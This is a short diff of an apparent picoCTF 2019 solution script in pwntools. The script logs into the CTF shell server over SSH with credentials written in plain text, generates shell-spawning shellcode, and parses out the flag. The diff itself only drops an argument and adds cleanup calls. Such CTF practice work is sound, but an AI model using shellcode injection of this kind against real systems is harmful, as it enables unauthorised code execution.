@@ -1,6 +1,6 @@
 from pwn import *
 
-session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)
+session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard")
 
 sc = shellcraft.sh()
 
@@ -23,3 +23,6 @@ flag = flagInB.decode('ascii')
 rawFlag = flag[flag.index('{')+1:flag.index('}')]
 
 print(rawFlag)
+
+program.close()
+session.close()
